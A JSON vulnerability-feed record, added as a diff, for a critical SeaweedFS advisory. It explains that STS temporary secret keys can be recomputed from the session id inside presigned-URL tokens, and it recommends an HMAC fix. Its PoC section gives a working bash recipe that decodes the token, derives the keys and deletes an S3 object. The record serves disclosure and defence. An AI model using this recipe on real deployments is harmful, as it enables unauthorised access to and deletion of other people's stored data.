@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-p983-2j86-34vj",
+  "aliases": [],
+  "title": "STS temporary credentials are recoverable from the session token",
+  "summary": "### Summary\n\nSeaweedFS derives an STS session's secret access key from the session id with a plain SHA-256 and no server-side secret, and publishes that session id inside the session token. Because the session token travels in `X-Amz-Security-Token`, including in the query string of every presigned URL, anyone who receives a presigned URL, or reads it out of a log, can recompute the full temporary credential and sign arbitrary S3 requests with the session's permissions until it expires.\n\n### Details\n\n`weed/iam/sts/token_utils.go:199-217`:\n\n```go\nfunc (c *CredentialGenerator) generateTemporaryAccessKeyId(sessionId string) (string, error) {\n\thash := sha256.Sum256([]byte(\"access-key:\" + sessionId))\n\treturn \"ASIA\" + hex.EncodeToString(hash[:8]), nil\n}\n\nfunc (c *CredentialGenerator) generateSecretAccessKey(sessionId string) (string, error) {\n\t// Create deterministic secret key based on session ID (not random!)\n\thash := sha256.Sum256([]byte(\"secret-key:\" + sessionId))\n\treturn base64.StdEncoding.EncodeToString(hash[:]), nil\n}\n```\n\n`sessionId` is 16 random bytes (`GenerateSessionId`, `token_utils.go:226`) but it is not secret: `NewSTSSessionClaims` (`weed/iam/sts/session_claims.go:103-120`) writes it into the JWT as `sub`, `jti` and `sid` (field at `session_claims.go:69`). A JWT payload is base64url, so reading it needs no key.\n\nThat token is accepted from the query string for presigned URLs (`weed/s3api/auth_signature_v4.go:236-239`):\n\n```go\nsessionToken := r.Header.Get(\"X-Amz-Security-Token\")\nif sessionToken == \"\" {\n\tsessionToken = r.URL.Query().Get(\"X-Amz-Security-Token\")\n}\n```\n\nVerification regenerates the credential from the session id rather than comparing a stored secret (`ToSessionInfo`, `session_claims.go:125-160` calling `GenerateTemporaryCredentials`), and `validateSTSSessionToken` (`auth_signature_v4.go:386-433`) only checks that the request's access key equals the regenerated one. Both sides therefore compute the attacker's value.\n\nEvery issuing path uses the same generator: `AssumeRoleWithWebIdentity` (`sts_service.go:610`), `AssumeRoleWithCredentials` / `AssumeRoleForPrincipal` (`sts_service.go:775`), `AssumeRole` (`s3api_sts.go:925`), `GetFederationToken` (`s3api_sts.go:806`) and Iceberg credential vending (`s3api_iceberg_credentials.go:70`).\n\nNote: the same token is separately accepted as `Authorization: Bearer` (`s3api_auth.go:18` reaching `s3_iam_middleware.go:186-225`), so a fix that only randomises the secret still leaves presigned URLs equivalent to credentials. The secret should be derived with an HMAC keyed on the STS signing key, for example `HMAC-SHA256(stsSigningKey, \"secret-key:\"+sessionId)`, which keeps the stateless design while making the value unguessable without the server key.\n\n### PoC\n\n**Configuration.** An S3 gateway with the advanced IAM/STS integration active: `weed s3 -iam.config=<file>`, or the default `-iam=true` whenever an STS signing key resolves (`jwt.filer_signing.key` in `security.toml`, or an initialised SSE-S3 KEK); see `weed/s3api/s3api_server.go:374-425`. Any deployment that issues STS credentials is in scope.\n\n**By hand.** Take any presigned URL generated from an STS session; it carries `X-Amz-Security-Token=eyJhbGciOiJIUzI1NiIs...`. With only that value:\n\n```bash\nTOKEN='<the X-Amz-Security-Token value from the URL>'\nSID=$(printf '%s' \"$TOKEN\" | cut -d. -f2 | tr '_-' '/+' \\\n        | awk '{ while (length($0)%4) $0=$0\"=\"; print }' | base64 -d \\\n        | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"sid\"])')\n\nAK=\"ASIA$(printf 'access-key:%s' \"$SID\" | sha256sum | cut -c1-16)\"\nSK=$(printf 'secret-key:%s' \"$SID\" | sha256sum | cut -d' ' -f1 | xxd -r -p | base64)\n\nAWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$TOKEN \\\n  aws --endpoint-url https://s3.example.com s3 rm s3://reports/2025-payroll.csv\n```\n\nThe URL delegated one `GET` on one object; the command deletes a different one.\n\n**Scripted.** A self-contained Go test drives the real STS service and the r...",
+  "published_at": "2026-11-09T19:51:10.000Z",
+  "modified_at": "2026-11-09T19:51:10.000Z",
+  "severity": {
+    "level": "critical",
+    "score": 9.1,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-341",
+    "CWE-522"
+  ],
+  "affected": [
+    {
+      "product": "seaweedfs",
+      "ranges": [
+        {
+          "introduced": "4.06"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-p983-2j86-34vj",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-p983-2j86-34vj",
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-p983-2j86-34vj",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:ddc82dc08f55d4a7ac34ef930320c705209d842adb742f0fb59bc14eaf605cf0",
+  "note": null
+}
